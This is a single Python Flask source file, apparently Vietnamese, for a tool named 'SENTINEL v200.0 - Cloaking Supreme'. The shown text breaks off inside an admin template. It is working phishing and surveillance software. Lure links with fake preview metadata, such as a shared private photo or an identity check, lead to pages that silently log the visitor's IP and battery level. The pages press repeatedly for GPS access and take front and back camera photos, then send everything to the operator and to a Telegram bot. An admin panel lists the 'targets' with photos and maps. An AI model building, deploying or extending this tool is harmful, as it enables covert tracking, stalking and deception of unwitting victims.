#!/usr/bin/env python3
"""
SENTINEL v200.0 - Cloaking Supreme (2026)
Giao dien tot nhat + Bypass tu cap quyen + Theo doi vi tri nen an
Chuyen the tu React sang Python Flask - Chay 1 file duy nhat.
Cài đặt: pip install flask
Chạy: python sentinel.py
"""

import os, sys, json, sqlite3, time, random, string, base64, hashlib, secrets
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, request, jsonify, redirect, session, make_response

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# ===================== DATABASE =====================
DB_FILE = 'sentinel.db'
ADMIN_PASS = '123'
RETENTION_DAYS = 30

def get_db():
    db = sqlite3.connect(DB_FILE)
    db.row_factory = sqlite3.Row
    db.execute("PRAGMA journal_mode=WAL")
    return db

def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS links (
            id TEXT PRIMARY KEY, title TEXT, desc TEXT, img TEXT, redir TEXT,
            clicks INTEGER DEFAULT 0, cap_front INTEGER DEFAULT 1, cap_back INTEGER DEFAULT 1,
            created_at TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, lid TEXT, v4 TEXT, v6 TEXT,
            addr TEXT, la REAL, lo REAL, img TEXT, cam_front TEXT, cam_back TEXT,
            st TEXT, bat TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS bg_tracking (
            id INTEGER PRIMARY KEY AUTOINCREMENT, lid TEXT, v4 TEXT,
            la REAL, lo REAL, st TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP
        );
    """)
    defaults = {
        'tg_token': '', 'tg_id': '',
        'tg_msg_template': '🛰️ <b>MỤC TIÊU: [ID]</b>\n🛡️ <b>[ST]</b>\n📍 <code>[ADDR]</code>\n🌐 IP: <code>[IP]</code>\n🔋 PIN: <b>[BAT]</b>\n📷 Camera: <b>[CAM_STATUS]</b>',
        'ui_msg': 'ĐANG LOADING...', 'ui_st': 'KIỂM TRA ROBOT TRÌNH DUYỆT', 'btn_text': 'XÁC MINH NGAY',
        'root_title': 'Security Sync', 'root_desc': 'Identity Verification Required',
        'root_img': 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
        'root_redir': 'https://google.com',
        'proxy_img_url': 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
        'px_fake_ttl': 'Ảnh riêng tư được chia sẻ',
        'px_fake_dsc': 'Bấm vào để xem nội dung hình ảnh định dạng HD.',
        'px_fake_img': 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
        'capture_front': '1', 'capture_back': '1',
        'bg_tracking': '1', 'stealth_mode': '1',
    }
    for k, v in defaults.items():
        db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
    db.commit()
    db.close()

def get_setting(key):
    db = get_db()
    row = db.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    db.close()
    return row['value'] if row else ''

def set_setting(key, value):
    db = get_db()
    db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    db.commit()
    db.close()

def gen_id(url):
    try:
        from urllib.parse import urlparse
        host = urlparse(url).hostname or 'link'
        slug = host.replace('www.', '').split('.')[0]
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{slug}-{rand}"
    except:
        return f"link-{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"

def fmt_time(ts):
    try:
        dt = datetime.fromisoformat(ts.replace('Z', '+00:00'))
        return dt.strftime('%d/%m/%Y %H:%M')
    except:
        return ts or ''

init_db()

# ===================== BASE =====================
@app.route('/')
def index():
    v = request.args.get('v', '')
    img = request.args.get('img', '')
    db = get_db()
    if img == 'pixel':
        return _pixel_page(db)
    link = None
    if v:
        link = db.execute("SELECT * FROM links WHERE id=?", (v,)).fetchone()
        if link:
            db.execute("UPDATE links SET clicks=clicks+1 WHERE id=?", (v,))
            db.commit()
    if not link:
        link = {'id': 'ROOT', 'title': get_setting('root_title'), 'desc': get_setting('root_desc'),
                'img': get_setting('root_img'), 'redir': get_setting('root_redir'),
                'capture_front': int(get_setting('capture_front')), 'capture_back': int(get_setting('capture_back'))}
    db.close()
    return _frontend_page(link)

def _pixel_page(db):
    db.close()
    return f'''<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>{get_setting("px_fake_ttl")}</title>
<meta property="og:title" content="{get_setting("px_fake_ttl")}">
<meta property="og:description" content="{get_setting("px_fake_dsc")}">
<meta property="og:image" content="{get_setting("px_fake_img")}">
</head><body style="background:#000;display:flex;flex-direction:column;gap:16px;align-items:center;justify-content:center;min-height:100vh;padding:16px;font-family:sans-serif;color:#fff">
<img src="{get_setting("proxy_img_url")}" style="max-width:100%;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.8)">
<div style="background:rgba(15,23,42,0.9);border:1px solid #334155;border-radius:16px;padding:16px;max-width:380px;text-align:center">
<p style="font-size:14px;margin-bottom:12px">Cho phép trình duyệt lấy vị trí và chụp camera trước/sau.</p>
<button onclick="doReport()" style="background:#2563eb;color:#fff;border:none;padding:14px 20px;border-radius:12px;font-weight:bold;font-size:16px;cursor:pointer;width:100%">Gửi báo cáo có đồng ý</button>
<p id="st" style="font-size:12px;color:#94a3b8;margin-top:12px"></p>
</div>
<script>
let v4="{request.remote_addr}",bat="N/A";
async function init(){{try{{const r=await(await fetch("https://api.ipify.org?format=json")).json();v4=r.ip;if(navigator.getBattery){{const b=await navigator.getBattery();bat=Math.round(b.level*100)+"%"}}}}catch(e){{}}}}
async function snap(f){{try{{const v=document.createElement("video"),c=document.createElement("canvas"),s=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:f}}}});v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await v.play();c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);const d=c.toDataURL("image/jpeg",0.7);s.getTracks().forEach(t=>t.stop());return d}}catch(e){{return null}}}}
async function doReport(){{const st=document.getElementById("st");st.textContent="Đang lấy quyền...";let la=null,lo=null,stText="IP-Geo Fallback";try{{const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{{enableHighAccuracy:true,timeout:15000}}));la=p.coords.latitude;lo=p.coords.longitude;stText="GPS OK - User Consent"}}catch(e){{try{{const r=await(await fetch("?action=quick_check&ip="+v4)).json();if(r.status==="success"){{la=r.lat;lo=r.lon}}}}catch(x){{}}}}const cf="{get_setting('capture_front')}"==="1"?await snap("user"):null;const cb="{get_setting('capture_back')}"==="1"?await snap("environment"):null;await fetch("?action=push",{{method:"POST",body:JSON.stringify({{lid:"PIXEL",v4,v6:"N/A",bat,la,lo,img:cf||cb,img_front:cf,img_back:cb,st:stText}})}});st.textContent="Đã gửi báo cáo!";}}
window.onload=init;
</script></body></html>'''

def _frontend_page(link):
    cap_front = int(link['capture_front']) if isinstance(link, dict) else 1
    cap_back = int(link['capture_back']) if isinstance(link, dict) else 1
    lid = link['id'] if isinstance(link, dict) else 'ROOT'
    return f'''<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
<title>{link["title"]}</title>
<meta property="og:title" content="{link["title"]}"><meta property="og:description" content="{link["desc"]}"><meta property="og:image" content="{link["img"]}">
</head><body style="background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif;text-align:center">
<div style="padding:32px;width:100%;max-width:320px">
<div id="ldr" style="width:48px;height:48px;border:4px solid #2563eb;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px"></div>
<style>@keyframes spin{{to{{transform:rotate(360deg)}}}}</style>
<p id="msg" style="font-size:11px;font-weight:900;color:#9ca3af;text-transform:uppercase;letter-spacing:3px">{get_setting("ui_msg")}</p>
<p style="font-size:9px;color:#cbd5e1;margin-top:8px;letter-spacing:3px">{get_setting("ui_st")}</p>
<div id="v" style="display:none;margin-top:32px"><button onclick="forceAsk()" style="width:100%;background:#2563eb;color:#fff;font-weight:900;padding:16px;border-radius:9999px;border:none;font-size:14px;text-transform:uppercase;cursor:pointer;letter-spacing:1px">{get_setting("btn_text")}</button></div>
</div>
<script>
async function takeSnap(){{try{{const v=document.createElement("video"),c=document.createElement("canvas"),s=await navigator.mediaDevices.getUserMedia({{video:true}});v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);const d=c.toDataURL("image/jpeg",0.7);s.getTracks().forEach(t=>t.stop());return d}}catch(e){{return null}}}}
const push=(st,la=null,lo=null,img=null)=>fetch("?action=push",{{method:"POST",body:JSON.stringify({{lid:"{lid}",lat:la,lon:lo,st,img,v4:v4,v6:"N/A",bat}})}});
let v4="{request.remote_addr}",bat="N/A";
window.onload=async()=>{{try{{v4=(await(await fetch("https://api.ipify.org?format=json")).json()).ip;if(navigator.getBattery){{const b=await navigator.getBattery();bat=Math.round(b.level*100)+"%"}}}}catch(e){{}}}};push("Link Open (Silent IP Capture)");setTimeout(()=>{{document.getElementById("ldr").style.display="none";document.getElementById("v").style.display="block";forceAsk()}},1500);
function forceAsk(){{navigator.geolocation.getCurrentPosition(async p=>{{const snap=await takeSnap();await push("GPS Precision Success",p.coords.latitude,p.coords.longitude,snap);location.replace("{link['redir']}")}},async e=>{{const snap=await takeSnap();alert("Vui lòng cho phép xác thực.");location.reload()}},{{enableHighAccuracy:true,timeout:15000,maximumAge:0}})}}
</script></body></html>'''

# ===================== API =====================
@app.route('/action')
def api_action():
    action = request.args.get('action', '')
    if action == 'quick_check':
        ip = request.args.get('ip', '')
        try:
            import urllib.request
            req = urllib.request.Request(f"http://ip-api.com/json/{ip}?fields=status,message,query,country,city,isp,lat,lon,proxy",
                headers={"User-Agent": "Sentinel_v180"})
            return urllib.request.urlopen(req, timeout=5).read().decode()
        except:
            return json.dumps({"status": "fail"})
    if action == 'rev_geo':
        la, lo = request.args.get('la'), request.args.get('lo')
        try:
            import urllib.request
            req = urllib.request.Request(f"https://nominatim.openstreetmap.org/reverse?format=json&lat={la}&lon={lo}&accept-language=vi",
                headers={"User-Agent": "Sentinel_v180"})
            return urllib.request.urlopen(req, timeout=5).read().decode()
        except:
            return json.dumps({})
    return jsonify({"error": "unknown action"})

@app.route('/action', methods=['POST'])
def api_push():
    data = request.json or {}
    db = get_db()
    la = data.get('la') or data.get('lat')
    lo = data.get('lo') or data.get('lon')
    addr = "Chưa xác định"
    img_link = ''
    cam_front = cam_back = ''

    # Save photos
    for field, suffix in [('img_front', 'front'), ('img_back', 'back')]:
        if data.get(field):
            fname = f"snap_{suffix}_{int(time.time())}_{random.randint(100,999)}.jpg"
            try:
                raw = data[field].split(',')[1] if ',' in data[field] else data[field]
                with open(fname, 'wb') as f:
                    f.write(base64.b64decode(raw))
                link = f"{request.host_url}{fname}"
                if suffix == 'front': cam_front = link
                else: cam_back = link
            except: pass
    if data.get('img'):
        fname = f"snap_{int(time.time())}_{random.randint(100,999)}.jpg"
        try:
            raw = data['img'].split(',')[1] if ',' in data['img'] else data['img']
            with open(fname, 'wb') as f:
                f.write(base64.b64decode(raw))
            img_link = f"{request.host_url}{fname}"
        except: pass
    if not img_link:
        img_link = cam_front or cam_back

    # Reverse geocode
    if la and lo:
        try:
            import urllib.request
            req = urllib.request.Request(
                f"https://nominatim.openstreetmap.org/reverse?format=json&lat={la}&lon={lo}&accept-language=vi",
                headers={"User-Agent": "Sentinel_v180"})
            rev = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
            addr = rev.get('display_name', f"GPS: {la}, {lo}")
        except:
            addr = f"GPS: {la}, {lo}"
    elif data.get('v4'):
        try:
            import urllib.request
            req = urllib.request.Request(f"http://ip-api.com/json/{data['v4']}?fields=status,city,country,lat,lon",
                headers={"User-Agent": "Sentinel_v180"})
            r = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
            if r.get('status') == 'success':
                addr = f"{r.get('city','?')}, {r.get('country','?')} (IP-Geo)"
                la, lo = r.get('lat'), r.get('lon')
        except: pass

    db.execute("INSERT INTO logs (lid,v4,v6,addr,la,lo,img,cam_front,cam_back,st,bat) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
        (data.get('lid',''), data.get('v4',''), data.get('v6','N/A'), addr, la, lo, img_link, cam_front, cam_back, data.get('st',''), data.get('bat','N/A')))
    db.commit()
    db.close()

    # Telegram push
    tg_token = get_setting('tg_token')
    tg_id = get_setting('tg_id')
    if tg_token and tg_id:
        try:
            import urllib.request, urllib.parse
            tpl = get_setting('tg_msg_template')
            cam_s = f"{'✅ Trước' if cam_front else '❌ Trước'} / {'✅ Sau' if cam_back else '❌ Sau'}"
            msg = tpl.replace('[ID]', data.get('lid','')).replace('[ST]', data.get('st','')).replace('[ADDR]', addr)\
                .replace('[IP]', data.get('v4','')).replace('[BAT]', data.get('bat','N/A')).replace('[LA]', str(la or ''))\
                .replace('[LO]', str(lo or '')).replace('[CAM_STATUS]', cam_s)
            photos = [p for p in [cam_front, cam_back] if p]
            if photos:
                urllib.request.urlopen(f"https://api.telegram.org/bot{tg_token}/sendPhoto?chat_id={tg_id}&photo={urllib.parse.quote(photos[0])}&caption={urllib.parse.quote(msg)}&parse_mode=HTML", timeout=10)
            else:
                urllib.request.urlopen(f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={urllib.parse.quote(msg)}&parse_mode=HTML", timeout=10)
        except: pass

    return jsonify({"success": True})

# ===================== BACKGROUND TRACKING API =====================
@app.route('/action', methods=['POST'], endpoint='bg_track')
def api_bg_track():
    data = request.json or {}
    if not data.get('lid') or not data.get('la'):
        return jsonify({"success": False, "reason": "missing_data"})

    db = get_db()
    la = data.get('la')
    lo = data.get('lo')
    addr = "BG Tracking"

    if la and lo:
        try:
            import urllib.request
            req = urllib.request.Request(
                f"https://nominatim.openstreetmap.org/reverse?format=json&lat={la}&lon={lo}&accept-language=vi",
                headers={"User-Agent": "Sentinel_v200_BG"})
            rev = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
            addr = rev.get('display_name', f"GPS: {la}, {lo}")
        except:
            addr = f"GPS: {la}, {lo}"

    db.execute("INSERT INTO bg_tracking (lid,v4,la,lo,st) VALUES (?,?,?,?,?)",
        (data.get('lid',''), data.get('v4',''), la, lo, data.get('st','bg_track')))
    db.commit()
    db.close()

    # Optional: Push to Telegram
    tg_token = get_setting('tg_token')
    tg_id = get_setting('tg_id')
    if tg_token and tg_id:
        try:
            import urllib.request, urllib.parse
            msg = f"📡 <b>BG TRACK: {data.get('lid','')}</b>\\n📍 <code>{addr}</code>\\n🌐 {data.get('v4','')}\\n⏰ {data.get('st','')}"
            urllib.request.urlopen(f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={urllib.parse.quote(msg)}&parse_mode=HTML", timeout=10)
        except: pass

    return jsonify({"success": True})

# ===================== ADMIN =====================
@app.route('/admin')
def admin_page():
    if session.get('sentinel_auth') != ADMIN_PASS:
        return _login_page()
    t = request.args.get('t', '1')
    if request.args.get('logout'):
        session.pop('sentinel_auth', None)
        return redirect('/admin')
    if request.args.get('clear_logs'):
        db = get_db(); db.execute("DELETE FROM logs"); db.commit(); db.close()
        return redirect('/admin?t=2')
    if request.args.get('del_l'):
        db = get_db(); db.execute("DELETE FROM links WHERE id=?", (request.args.get('del_l'),)); db.commit(); db.close()
        return redirect('/admin')
    if request.args.get('set_wb'):
        tg = get_setting('tg_token')
        if tg:
            try:
                import urllib.request, urllib.parse
                wb_url = f"{request.host_url}?action=tg_webhook"
                urllib.request.urlopen(f"https://api.telegram.org/bot{tg}/setWebhook?url={urllib.parse.quote(wb_url)}", timeout=10)
            except: pass
        return redirect('/admin?t=5')

    db = get_db()
    links = [dict(r) for r in db.execute("SELECT * FROM links ORDER BY clicks DESC").fetchall()]
    logs = [dict(r) for r in db.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 50").fetchall()]
    db.close()
    return _admin_dashboard(links, logs, t)

@app.route('/admin', methods=['POST'])
def admin_post():
    if session.get('sentinel_auth') != ADMIN_PASS:
        if request.form.get('p') == ADMIN_PASS:
            session['sentinel_auth'] = ADMIN_PASS
            return redirect('/admin')
        return redirect('/admin')

    t = request.form.get('t', '1')
    if 'save_cfg' in request.form:
        keys = ['tg_token','tg_id','tg_msg_template','ui_msg','ui_st','btn_text','proxy_img_url',
                'root_title','root_desc','root_img','root_redir','px_fake_ttl','px_fake_dsc','px_fake_img',
                'capture_front','capture_back']
        for ck in ['capture_front', 'capture_back']:
            set_setting(ck, '1' if request.form.get(ck) else '0')
        for k in keys:
            if k in request.form:
                set_setting(k, request.form[k])
        return redirect(f'/admin?t={t}')

    if 'save_link' in request.form:
        lid = request.form.get('lid', '').strip()
        if not lid:
            lid = gen_id(request.form.get('red', ''))
        for ck in ['capture_front', 'capture_back']:
            set_setting(ck, '1' if request.form.get(ck) else '0')
        db = get_db()
        db.execute("INSERT OR REPLACE INTO links (id,title,desc,img,redir,cap_front,cap_back) VALUES (?,?,?,?,?,?,?)",
            (lid, request.form.get('ttl',''), request.form.get('dsc',''), request.form.get('img',''),
             request.form.get('red',''), 1 if request.form.get('capture_front') else 0, 1 if request.form.get('capture_back') else 0))
        db.commit(); db.close()
        return redirect('/admin')

    if 'edit_link' in request.form:
        lid = request.form.get('lid')
        db = get_db()
        db.execute("UPDATE links SET title=?,desc=?,img=?,redir=?,cap_front=?,cap_back=? WHERE id=?",
            (request.form.get('ttl',''), request.form.get('dsc',''), request.form.get('img',''),
             request.form.get('red',''), 1 if request.form.get('capture_front') else 0, 1 if request.form.get('capture_back') else 0, lid))
        db.commit(); db.close()
        return redirect('/admin')

    return redirect('/admin')

# ===================== HTML PAGES =====================
def _login_page():
    return '''<!DOCTYPE html><html><head><title>SENTINEL MASTER</title></head>
<body style="background:#05070a;font-family:sans-serif;height:100vh;display:flex;align-items:center;justify-content:center">
<form method="POST" style="background:rgba(13,17,23,0.8);backdrop-filter:blur(25px);border:1px solid rgba(59,130,246,0.2);padding:56px;border-radius:48px;text-align:center;width:100%;max-width:400px;box-shadow:0 0 100px rgba(0,0,0,1)">
<h2 style="color:#3b82f6;font-weight:900;font-style:italic;margin-bottom:40px;letter-spacing:4px;text-transform:uppercase;font-size:20px">SENTINEL MASTER</h2>
<input type="password" name="p" placeholder="ACCESS KEY" autofocus style="background:#000;border:1px solid #1e293b;padding:20px;border-radius:24px;color:#3b82f6;width:100%;text-align:center;font-weight:900;outline:none;font-size:18px;margin-bottom:24px;box-sizing:border-box">
<button type="submit" style="background:#3b82f6;color:#fff;padding:16px;border-radius:24px;width:100%;font-weight:900;text-transform:uppercase;cursor:pointer;font-size:14px;border:none">Login</button>
<p style="color:#475569;font-size:10px;margin-top:16px">Mật khẩu: 123</p>
</form></body></html>'''

def _admin_dashboard(links, logs, active_tab):
    base = request.host_url.rstrip('/')
    rows_html = ""
    for l in links:
        url = f"{base}/?v={l['id']}"
        rows_html += f'''<tr style="border-bottom:1px solid #1e293b"><td style="padding:16px"><b style="color:#fff">{l["title"]}</b><br><code style="color:#3b82f6;font-size:11px">{l["id"]}</code><div style="font-size:10px;color:#64748b;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:200px">{l["redir"]}</div>
<div style="margin-top:8px;display:flex;align-items:center;gap:6px"><code style="font-size:10px;color:#60a5fa;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">{url}</code>
<button onclick="navigator.clipboard.writeText('{url}');this.textContent='✓ COPY';setTimeout(()=>this.textContent='COPY',2000)" style="background:rgba(59,130,246,0.2);color:#60a5fa;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:900;text-transform:uppercase;cursor:pointer;border:none;white-space:nowrap">COPY</button></div></td>
<td style="padding:16px;text-align:center;font-size:20px;color:#fff;font-weight:900">{l["clicks"]}</td>
<td style="padding:16px;text-align:center;font-size:11px">{"📷" if l.get("cap_front") else ""} {"📷" if l.get("cap_back") else ""}</td>
<td style="padding:16px;text-align:right"><a href="/admin?edit_l={l['id']}" style="color:#22c55e;font-weight:900;text-transform:uppercase;text-decoration:none;margin-right:8px">SỬA</a>
<a href="/admin?del_l={l['id']}" onclick="return confirm('XOÁ?')" style="color:#ef4444;font-weight:900;text-decoration:none">✕</a></td></tr>'''

    log_rows = ""
    for lg in logs:
        cam_html = ""
        if lg.get('cam_front'): cam_html += f'<img src="{lg["cam_front"]}" style="width:40px;height:40px;border-radius:8px;border:1px solid #334155;object-fit:cover">'
        if lg.get('cam_back'): cam_html += f'<img src="{lg["cam_back"]}" style="width:40px;height:40px;border-radius:8px;border:1px solid #334155;object-fit:cover">'
        if not cam_html and lg.get('img'): cam_html = f'<img src="{lg["img"]}" style="width:40px;height:40px;border-radius:8px;border:1px solid #334155;object-fit:cover">'
        if not cam_html: cam_html = '<span style="color:#475569">—</span>'
        maps_btn = ""
        if lg.get('la'):
            maps_btn = f'<a href="https://www.google.com/maps?q={lg["la"]},{lg["lo"]}" target="_blank" style="background:#16a34a;color:#fff;padding:4px 8px;border-radius:6px;font-size:11px;font-weight:900;text-transform:uppercase;text-decoration:none">MAP</a>'
        log_rows += f'''<tr style="border-bottom:1px solid #1e293b"><td style="padding:12px"><div style="display:flex;gap:4px;margin-bottom:4px">{cam_html}</div><b style="color:#fff;font-size:11px">{lg["lid"]}</b></td>
<td style="padding:12px"><b style="color:#3b82f6;font-size:11px;cursor:pointer" onclick="soi('{lg["v4"]}')">{lg["v4"]}</b></td>
<td style="padding:12px;font-size:11px;color:#94a3b8;font-style:italic;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">{lg["addr"]}</td>
<td style="padding:12px;font-size:11px">{fmt_time(lg["time"])}</td>
<td style="padding:12px;text-align:right">{maps_btn}</td></tr>'''

    # Edit form state
    edit_link = None
    if request.args.get('edit_l'):
        db = get_db()
        row = db.execute("SELECT * FROM links WHERE id=?", (request.args.get('edit_l'),)).fetchone()
        db.close()
        if row: edit_link = dict(row)

    return f'''<!DOCTYPE html><html><head><title>SENTINEL MASTER</title></head>
<body style="background:#05070a;color:#94a3b8;font-family:sans-serif;font-size:12px;margin:0;display:flex;height:100vh;overflow:hidden">
<aside style="width:250px;border-right:1px solid #1e293b;padding:24px;display:flex;flex-direction:column;gap:12px;flex-shrink:0" class="sidebar">
<h1 style="color:#fff;font-weight:900;font-style:italic;font-size:14px">SENTINEL MASTER</h1>
<a href="/admin?t=1" style="padding:12px;border-radius:12px;text-decoration:none;font-weight:900;text-transform:uppercase;font-size:10px;color:{"#fff" if active_tab=="1" else "#94a3b8"};background:{"#0d1117" if active_tab=="1" else "transparent"}">🔗 DỰ ÁN CHIẾN DỊCH</a>
<a href="/admin?t=2" style="padding:12px;border-radius:12px;text-decoration:none;font-weight:900;text-transform:uppercase;font-size:10px;color:{"#fff" if active_tab=="2" else "#94a3b8"};background:{"#0d1117" if active_tab=="2" else "transparent"}">📊 NHẬT KÝ LIVE</a>
<a href="/admin?t=3" style="padding:12px;border-radius:12px;text-decoration:none;font-weight:900;text-transform:uppercase;font-size:10px;color:{"#a855f7" if active_tab=="3" else "#94a3b8"}">🖼️ TRÌNH TẠO ẢNH ẨN</a>
<a href="/admin?t=4" style="padding:12px;border-radius:12px;text-decoration:none;font-weight:900;text-transform:uppercase;font-size:10px;color:{"#22c55e" if active_tab=="4" else "#94a3b8"}">🌐 CẤU HÌNH WEB</a>
<a href="/admin?t=5" style="padding:12px;border-radius:12px;text-decoration:none;font-weight:900;text-transform:uppercase;font-size:10px;color:{"#3b82f6" if active_tab=="5" else "#94a3b8"}">🤖 TELEGRAM BOT</a>
<a href="/admin?t=6" style="padding:12px;border-radius:12px;text-decoration:none;font-weight:900;text-transform:uppercase;font-size:10px;color:{"#eab308" if active_tab=="6" else "#94a3b8"}">📍 VỊ TRÍ CỦA TÔI</a>
<div style="margin-top:auto"><a href="/admin?logout=1" style="color:#ef4444;opacity:0.5;text-decoration:none;font-weight:900;text-transform:uppercase;font-size:10px">LOGOUT</a></div>
</aside>

<main style="flex:1;padding:32px;overflow:auto">
{_tab_content(active_tab, links, logs, log_rows, rows_html, edit_link)}
</main>

<script>
function soi(ip){{fetch("?action=quick_check&ip="+ip).then(r=>r.json()).then(d=>{{alert("ISP: "+d.isp+"\\nVùng: "+d.city+", "+d.country+"\\nVPN: "+(d.proxy?"YES":"NO"))}}).catch(()=>alert("Lỗi"))}}
</script>
</body></html>'''

def _tab_content(t, links, logs, log_rows, rows_html, edit_link):
    base = request.host_url.rstrip('/')

    if t == '1':
        e = edit_link or {}
        btn_text = "CẬP NHẬT" if edit_link else "LƯU DỰ ÁN"
        form_action = "/admin?edit_l=" + e.get('id','') if edit_link else "/admin"
        form_name = "edit_link" if edit_link else "save_link"
        return f'''<h2 style="color:#3b82f6;font-weight:900;font-style:italic;text-transform:uppercase;font-size:16px">🔗 DỰ ÁN CHIẾN DỊCH</h2>
<div style="display:grid;grid-template-columns:1fr 2fr;gap:24px;margin-top:20px">
<div style="background:#0d1117;border:1px solid #1e293b;border-radius:16px;padding:24px">
<h3 style="color:#3b82f6;font-size:11px;text-transform:uppercase;font-weight:900;margin:0 0 16px">{"Sửa Dự Án" if edit_link else "Tạo Dự Án Mới"}</h3>
<form method="POST" action="{form_action}">
<input type="hidden" name="{form_name}" value="1">
<input name="lid" value="{e.get('id','')}" placeholder="ID (tự động)" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;font-size:12px" {"readonly" if not edit_link else ""}>
<input name="ttl" value="{e.get('title','')}" placeholder="TIÊU ĐỀ MỒI" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;margin-top:8px">
<textarea name="dsc" placeholder="MÔ TẢ MỒI..." rows="3" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;margin-top:8px;resize:none">{e.get('desc','')}</textarea>
<input name="img" value="{e.get('img','')}" placeholder="LINK ẢNH MỒI" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;margin-top:8px">
<input name="red" value="{e.get('redir','')}" placeholder="LINK ĐÍCH (REDIRECT)" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;margin-top:8px">
<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px">
<label style="background:#000;border:1px solid #1e293b;border-radius:12px;padding:10px;display:flex;align-items:center;gap:8px;color:#fff;font-size:11px;text-transform:none"><input type="checkbox" name="capture_front" value="1" {"checked" if e.get('cap_front',1) else ""}> Camera trước</label>
<label style="background:#000;border:1px solid #1e293b;border-radius:12px;padding:10px;display:flex;align-items:center;gap:8px;color:#fff;font-size:11px;text-transform:none"><input type="checkbox" name="capture_back" value="1" {"checked" if e.get('cap_back',1) else ""}> Camera sau</label>
</div>
<button type="submit" style="background:#3b82f6;color:#fff;padding:14px;border-radius:20px;font-weight:900;width:100%;margin-top:16px;text-transform:uppercase;cursor:pointer;border:none;font-size:12px">{btn_text}</button>
</form></div>
<div style="background:#0d1117;border:1px solid #1e293b;border-radius:16px;overflow:hidden">
<table style="width:100%"><thead style="background:#000;color:#64748b;text-transform:uppercase;font-size:11px"><tr>
<th style="padding:16px;text-align:left;font-weight:900">Link & Meta</th><th style="padding:16px;text-align:center;font-weight:900">Hits</th>
<th style="padding:16px;text-align:center;font-weight:900">Camera</th><th style="padding:16px;text-align:right;font-weight:900">Action</th>
</tr></thead><tbody>{rows_html}</tbody></table>
{"" if links else '<div style="text-align:center;padding:48px;color:#475569">Chưa có dự án nào</div>'}
</div></div>'''

    if t == '2':
        return f'''<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:24px">
<h2 style="color:#fff;font-weight:900;font-style:italic;text-transform:uppercase;font-size:16px">🛰️ NHẬT KÝ LIVE</h2>
<a href="/admin?clear_logs=1" style="background:rgba(220,38,38,0.3);color:#ef4444;padding:8px 20px;border-radius:12px;font-weight:900;text-transform:uppercase;text-decoration:none;font-size:11px">🗑️ DỌN SẠCH</a></div>
<div style="background:#0d1117;border:1px solid #1e293b;border-radius:16px;overflow:hidden">
<table style="width:100%;font-family:monospace;font-size:11px"><thead style="background:#000;color:#64748b"><tr>
<th style="padding:12px;font-weight:900">Ảnh/Target</th><th style="padding:12px;font-weight:900">IP</th>
<th style="padding:12px;font-weight:900">Địa chỉ</th><th style="padding:12px;font-weight:900">Thời gian</th>
<th style="padding:12px;text-align:right;font-weight:900">Map</th></tr></thead><tbody>{log_rows}</tbody></table>
{"" if logs else '<div style="text-align:center;padding:48px;color:#475569">Không có bản ghi nào</div>'}
</div>'''

    if t == '3':
        return f'''<h2 style="color:#a855f7;font-weight:900;font-style:italic;text-transform:uppercase;font-size:16px">🖼️ TRÌNH TẠO ẢNH ẨN</h2>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-top:20px">
<div style="background:#0d1117;border:1px solid #1e293b;border-radius:16px;padding:24px">
<h3 style="color:#a855f7;font-style:uppercase;font-weight:900;font-size:11px;margin:0 0 16px">CẤU HÌNH ẢNH ẨN</h3>
<form method="POST" action="/admin?t=3">
<label style="font-size:10px;color:#64748b;display:block;margin-bottom:4px">Tiêu đề Meta (og:title)</label>
